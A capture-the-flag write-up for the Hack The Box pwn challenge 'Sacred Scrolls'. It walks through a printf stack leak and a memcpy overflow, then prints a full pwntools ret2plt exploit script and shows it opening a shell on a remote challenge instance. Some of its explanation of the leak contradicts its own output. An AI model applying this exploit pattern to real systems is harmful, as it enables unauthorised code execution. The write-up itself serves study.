---
title: "Sacred Scrolls 🔮 - ret2plt, ROP, Ghidra & Leak Analysis"
tags: [HTB, binary exploitation, ret2plt, stack overflow, file upload, infoleak]
---

# Sacred Scrolls 🔮

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTb-Challenge-green)

> Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. 

> Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.

A cursed scroll and an insecure spell-loading mechanism—mix that with some ROP magic, and you're in.

## 📚 Table of Contents
- [Binary Protections 🛡️](#binary-protections-️)
- [Static Analysis with Ghidra 🔬](#static-analysis-with-ghidra-)
- [Leak Explanation 🩻](#leak-explanation-)
- [Vulnerability Analysis 🔍](#vulnerability-analysis-)
- [Exploit Strategy 💣](#exploit-strategy-)
- [ROP Chain Construction 🧱](#rop-chain-construction-)
- [Exploit Script 🧨](#exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections 🛡️

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Canary:   No canary
NX:       Enabled
PIE:      Disabled (0x400000)
```

## Static Analysis with Ghidra 🔬

There are few interesting functions, like spell_upload, spell_read, spell_save and the main function itself.

### Spell upload

We can see these lines, with hardcoded hexadecimal values. 

```c
  *(undefined8 *)(auStack_1230 + uVar3 + 7) = 0x65736162207c2027;
  *(undefined8 *)((long)local_1228 + uVar3 + 7) = 0x203e20642d203436;
  *(undefined8 *)((long)auStack_1211 + (uVar3 - 8)) = 0x697a2e6c6c657073;
  *(undefined2 *)((long)auStack_1211 + uVar3) = 0x70;
  auStack_1230 = (undefined  [8])0x400c9f;
  system(local_1228);
```

If we decode it: 

```bash
└──╼ $echo 70697a2e6c6c657073203e20642d20343665736162207c2027 | xxd -r -p | rev
' | base64 -d > spell.zip
```

These hex values are crafted in memory to build a full shell command like '| base64 -d > spell.zip', then passed to system().

### Spell read

The function unzip the file and read it, but it returns the content only if the text file begin with a special signature:

```c
  iVar1 = strncmp(__s1,&DAT_00401322,4);
  if (iVar1 == 0) {
    iVar1 = strncmp(__s1 + 4,&DAT_00401327,3);
    if (iVar1 == 0) {
      close((int)__stream);
      return __s1;
    }
  }
```

Content of data:

```c
                             DAT_00401322                                    XREF[1]:     spell_read:00400d97(*)  
        00401322 f0              ??         F0h
        00401323 9f              ??         9Fh
        00401324 91              ??         91h
        00401325 93              ??         93h
        00401326 00              ??         00h
                             DAT_00401327                                    XREF[1]:     spell_read:00400db7(*)  
        00401327 e2              ??         E2h
        00401328 9a              ??         9Ah
        00401329 a1              ??         A1h
        0040132a 00              ??         00h
        0040132b 00              ??         00h
        0040132c 00              ??         00h
        0040132d 00              ??         00h
        0040132e 00              ??         00h
        0040132f 00              ??         00h
```

So our text file should begin with: `\xf0\x9f\x91\x93\xe2\x9a\xa1`.

### Spell save

```c
void spell_save(void *param_1)

{
  undefined local_28 [32];
  
  memcpy(local_28,param_1,600);
  printf("%s\n[-] This spell is not quiet effective, thus it will not be saved!\n",&DAT_0040127f);
  return;
}
```

Uh, we memcpy a size set to 600 in a local_28 variable fixed with a size of 32. BOF spotted!

### In the main function, 🧾 `read()` and `printf("%s")` Wizard Input

```c
read(0, auStack_708, 0x5ff);
printf("Interact with magic library %s", local_40);
```

- A large buffer (`0x5ff` = 1535 bytes) is read into a buffer of size 1528
- Only a 7-byte overflow—**not enough to reach RIP**
- But crucially, `local_40` is a pointer to `auStack_708`
- Which is then passed to `printf("%s")` → this prints everything from that pointer

## Leak Explanation 🩻

By sending `b'A' * 16`, we place a known marker on the stack. Then `printf("%s", local_40)` prints everything after that. What comes **after** our input is simply **what was already on the stack**.

### Why just 16 "A"s?

On a fresh stack frame, `auStack_708` contains your input at the start, followed by whatever was already there—possibly uninitialized or leftovers from `.rodata` or libc initializations.

### 🧠 Stack Layout

When sending input like b"A"*16, the memory layout looks like this:

```c
Stack (auStack_708):

[0x00]  0x4141414141414141   ← "A" * 8
[0x08]  0x4141414141414141   ← "A" * 8
[0x10]  0x0000000000601080   ← 🟢 pointer to "/bin/sh"
```

Since `printf("%s", local_40)` prints starting from your input (`local_40 → auStack_708`), sending exactly 16 bytes allows the %s to "fall through" and leak the next 8 bytes on the stack — here, an address pointing to `"/bin/sh"`.

### 🧩 Summary

By filling exactly **16 bytes**, we let `printf("%s")` continue reading the stack, leaking the `8-byte address` that follows our input — usually a pointer to `"/bin/sh"` thanks to the binary’s memory layout.

After debugging the binary in GDB, we observed that **the 8 bytes right after our `A*16` matched an address**. When examined:

```bash
gdb ./sacred_scrolls
> run
> Enter your wizard tag: AAAAAAAAAAAAAAAA
> x/s 0xADDRESS_LEAKED
```

It showed:
```
0x601080: "/bin/sh"
```

This confirmed that what we leaked was indeed a pointer to `"/bin/sh"`.

### Why is `/bin/sh` even there?

Because the binary includes `system()` via PLT, and likely references this string internally or through libc preparation. 

Since PIE is disabled, the address of this string is **always the same**.

This gives us a perfect primitive to:
- Leak the address of `"/bin/sh"` (no libc needed!)
- Build a ROP chain to `system@plt`

## Vulnerability Analysis 🔍

The binary:
- Leak us the /bin/sh address in the memory
- Check a signature to read the file, but it's hardcoded and we can reproduce it
- Overflows stack with large memcpy

## Exploit Strategy 💣

1. Leak a `"/bin/sh"` string from memory via `printf("%s")`
2. Craft a payload file beginning with the required signature
3. Overflow the stack via `memcpy()`
4. Execute `system("/bin/sh")` via ROP

## ROP Chain Construction 🧱

We use:
- `pop rdi; ret` → dynamically found via `ROP()`
- `system@plt` → from ELF
- `/bin/sh` string → leaked dynamically

No libc leak required due to no PIE + static linking of useful strings/symbols.

### Find the offset to reach RIP with cyclic

First with pwndbg, start the binary:

```c
└──╼ $gdb ./sacred_scrolls 
...
pwndbg> set follow-fork-mode parent
pwndbg> run
...
Enter your wizard tag: notagain

Interact with magic library notagain

1. Upload ⅀ ℙ ∉ ⎳ ⎳
2. Read   ⅀ ℙ ∉ ⎳ ⎳
2. Cast   ⅀ ℙ ∉ ⎳ ⎳
3. Leave

>> 
```

In another shell, let's craft a zip file ready to be called for the read function:

```c
└──╼ $echo -ne "\xf0\x9f\x91\x93\xe2\x9a\xa1$(pwn cyclic 1000)" > spell.txt && zip spell.zip spell.txt
  adding: spell.txt (deflated 61%)
```

(Don't forget the signature, else the read function will fail).

Now in pwndbg let's try to read it!

```c
>> 2
[Detaching after vfork from child process 640130]
Archive:  spell.zip
replace spell.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: spell.txt               

⅀ ℙ ∉ ⎳ ⎳: 👓⚡aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabx`����

1. Upload ⅀ ℙ ∉ ⎳ ⎳
2. Read   ⅀ ℙ ∉ ⎳ ⎳
2. Cast   ⅀ ℙ ∉ ⎳ ⎳
3. Leave

>> 3
```

Oops, SIGSEGV detected:

```c
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400ee1 in spell_save ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
 RAX  0x4a
 RBX  0
 RCX  0x7ffff7d14a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7fffffffb2e0 —▸ 0x7ffff7c620d0 (funlockfile) ◂— endbr64 
 RSI  0x7fffffffb400 ◂— 0xa6d31333b315b1b
 R8   0x4a
 R9   0x7fffffff
 R10  0
 R11  0x246
 R12  0x600
 R13  0
 R14  0x600
 R15  0
 RBP  0x6961616168616161 ('aaahaaai')
 RSP  0x7fffffffd558 ◂— 0x6b6161616a616161 ('aaajaaak')
 RIP  0x400ee1 (spell_save+62) ◂— ret 
```

Here is our offset: 

```c
└──╼ $pwn cyclic -l aaajaaak
33
```

## Exploit Script 🧨

```python
#!/usr/bin/env python3
from pwn import *
import os, sys, argparse

context.binary = './sacred_scrolls'
elf = context.binary

def get_process(args):
    if args.host and args.port:
        return remote(args.host, int(args.port))
    return process(elf.path)

def leak_bin_sh(p):
    p.sendafter(b'Enter your wizard tag: ', b'A' * 16)
    p.recvuntil(b'A' * 16)
    bin_sh = u64(p.recvline().strip().ljust(8, b'\0'))
    log.success(f'Leaked "/bin/sh" address: {hex(bin_sh)}')
    return bin_sh

def build_rop_payload(bin_sh_addr):
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    system = elf.plt['system']

    payload  = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'  # Decorative emoji bytes
    payload += b'A' * 33
    payload += p64(pop_rdi)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi + 1)  # ret gadget for alignment
    payload += p64(system)
    return payload

def zip_payload(payload):
    with open('spell.txt', 'wb') as f:
        f.write(payload)

    os.system('zip spell.zip spell.txt > /dev/null')
    os.remove('spell.txt')

    with open('spell.zip', 'rb') as f:
        b64_payload = b64e(f.read()).encode()

    return b64_payload

def send_payload(p, b64_payload):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Enter file (it will be named spell.zip): ', b64_payload)

def trigger_exploit(p):
    p.sendlineafter(b'>> ', b'2')  # Unzip the file
    p.sendlineafter(b'>> ', b'3')  # Trigger the overflow

def main():
    parser = argparse.ArgumentParser(description="Exploit for Getting Started (HTB)")
    parser.add_argument('--host', help='Remote host')
    parser.add_argument('--port', help='Remote port')
    args = parser.parse_args()
    
    p = get_process(args)
    bin_sh_addr = leak_bin_sh(p)
    payload = build_rop_payload(bin_sh_addr)
    b64_payload = zip_payload(payload)
    send_payload(p, b64_payload)
    trigger_exploit(p)
    p.interactive()

if __name__ == '__main__':
    main()
```

- Uses argparse: `--host` and `--port` for remote, or defaults to local
- Base64 encodes the payload and zips it automatically
- Payload includes the mandatory magic header
- Fully dynamic gadget and address discovery

```bash
python3 sacred_scrolls_exploit_final.py
python3 sacred_scrolls_exploit_final.py --host 1.2.3.4 --port 1337
```

## Exploitation Result ✅

```bash
└──╼ $python3 exploit.py --host 94.237.53.203 --port 36648
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    Stripped:   No
[+] Opening connection to 94.237.53.203 on port 36648: Done
[+] Leaked "/bin/sh" address: 0x7f3f526fb698
[*] Loaded 14 cached gadgets for './sacred_scrolls'
[*] Switching to interactive mode

[-] This spell is not quiet effective, thus it will not be saved!
$ whoami
ctf
$ cat flag*
HTB{s1gn3ed_sp3ll5_fr0m_th3_b01_wh0_l1v3d}
```

## Conclusion 🧾

This challenge is a beautiful example of real-world exploitation patterns:
- A quirky file format check
- A base64-encoded command injection pathway
- A powerful classic: stack overflow via `memcpy()`
- Clean ROP execution using ret2plt

And the best part? The magic emoji header is the perfect cursed payload signature 🔮

🔙 [Back to Writeups](../../)
